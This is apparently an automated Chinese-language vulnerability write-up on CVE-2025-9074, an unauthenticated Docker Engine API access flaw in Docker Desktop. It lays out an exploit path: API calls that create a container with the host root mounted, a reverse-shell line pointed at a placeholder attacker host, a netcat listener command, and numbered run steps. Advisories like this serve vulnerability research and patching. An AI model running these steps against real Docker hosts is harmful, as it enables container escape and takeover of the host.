## CVE-2025-9074 - Docker Desktop 未授权访问, 容器逃逸, 权限提升

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 未授权访问, 容器逃逸, 权限提升

**影响应用:** Docker Desktop

**危害等级:** 高危

**CVSS评分:** 9.3

**影响版本:** Docker Desktop 4.44.3之前的版本 (包括Windows和macOS版本)

**利用条件:** 本地运行的恶意Linux容器可通过默认子网访问Docker Engine API，无需认证。此漏洞不依赖挂载、不依赖增强容器隔离(ECI)功能，也不依赖“Expose daemon on tcp://localhost:2375 without TLS”选项。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-9074是一个存在于Docker Desktop（包括Windows和macOS版本）中的高危漏洞，CVSS评分为9.3。该漏洞允许本地运行的恶意Linux容器绕过隔离机制，通过默认子网（通常是192.168.65.7:2375）未经授权地访问Docker Engine API。这意味着，一旦攻击者成功在一个Docker Desktop实例上运行了恶意容器，他们就可以利用此漏洞直接与宿主机的Docker守护进程进行交互，从而实现容器逃逸和对宿主机的完全控制。此漏洞的发现者是安全研究员Felix Boulet，漏洞已于2025年8月20日在Docker Desktop 4.44.3版本中得到修复。

**POC有效性分析：**
所提供的POC是一个`bash`脚本，名为`CVE-2025-9074.sh`，旨在演示此未授权访问和容器逃逸漏洞。该脚本利用`curl`工具直接与Docker Engine API进行HTTP通信，而无需任何认证。脚本首先通过`/images/json`接口获取当前系统中的一个可用镜像。随后，它构造一个JSON负载，通过`/containers/create`接口创建一个新的容器。这个新容器被精心配置，其执行命令（`Cmd`）被设置为一个反向Shell payload (`bash -i >& /dev/tcp/LHOST/LPORT 0>&1`)，旨在连接回攻击者指定的监听地址和端口。更重要的是，在`HostConfig`中，脚本将宿主机的根目录（在Windows上是`/mnt/host/c`，在类Unix系统上是`/`）挂载到新创建的容器中，使得新容器可以直接访问宿主机的整个文件系统。最后，脚本通过`/containers/${ID}/start`接口启动这个恶意容器。整个流程清晰、逻辑严谨，利用了Docker API的未授权访问特性，成功实现了从容器内部获取宿主机反向Shell和文件系统访问权限，从而实现宿主机接管。此POC代码功能完整，且包含了明确的用法说明和依赖项提示，故评估其质量为9/10。

**利用步骤：**
1.  **准备攻击机：** 在攻击者控制的机器上，启动一个网络监听器以接收反向Shell连接。例如，使用Netcat命令：`nc -lvnp <LPORT>` (将`<LPORT>`替换为监听端口，如9002)。
2.  **获取POC脚本：** 将提供的`CVE-2025-9074.sh`脚本复制到目标Docker Desktop环境中已受控的恶意Linux容器内部。
3.  **执行POC脚本：** 在恶意容器中，执行POC脚本，并提供正确的参数。参数应包括Docker Engine API的IP地址和端口、攻击者的IP地址和监听端口。默认的Docker Engine API地址通常为`192.168.65.7`，端口为`2375`。示例命令：`sh CVE-2025-9074.sh 192.168.65.7 2375 <LHOST> <LPORT>` (将`<LHOST>`替换为攻击机IP，`<LPORT>`替换为监听端口)。
4.  **接收反向Shell：** 如果利用成功，攻击机上的监听器将接收到一个来自宿主机的反向Shell连接，从而获得宿主机的命令行访问权限，并能通过挂载点访问宿主机文件系统。

**投毒风险分析：**
所分析的POC代码是一个标准的`bash`脚本，其内容清晰、结构简单，易于阅读和理解。脚本的核心功能是通过`curl`命令与Docker Engine API进行交互，以创建并启动一个带有反向Shell和宿主机文件系统挂载的新容器。其中，反向Shell的Payload (`bash -i >& /dev/tcp/LHOST/LPORT 0>&1`) 是一个广为人知且广泛用于安全测试的标准命令，用于建立一个交互式Shell连接。脚本中没有发现任何代码混淆、加密、动态加载外部资源、`eval`函数滥用或其他旨在隐藏恶意行为的迹象。所有操作均是直接的HTTP请求和命令执行。由于其代码透明度高，且执行逻辑完全围绕漏洞验证展开，并未包含额外或不相关的可疑行为。因此，可以认为这份POC代码被“投毒”的风险非常低。虽然任何来自第三方的代码在执行前都应进行严格审查，但就这份POC而言，其设计目的和实现方式均符合安全研究和漏洞演示的范畴，被恶意篡改以引入额外危害的可能性较低。综合评估，投毒风险定为10%。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
